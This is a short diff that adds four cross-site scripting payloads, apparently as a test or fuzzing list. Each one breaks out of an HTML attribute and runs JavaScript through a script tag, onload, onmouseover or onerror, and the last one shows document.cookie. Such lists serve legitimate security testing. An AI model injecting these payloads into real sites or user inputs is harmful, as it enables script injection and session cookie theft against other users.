@@ -1,0 +1,4 @@
+"/><script>window.alert('lol')</script>
+"><body onload=alert('test1')>
+"><b onmouseover=alert('Wufff!')>click me!</b>
+"><img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>
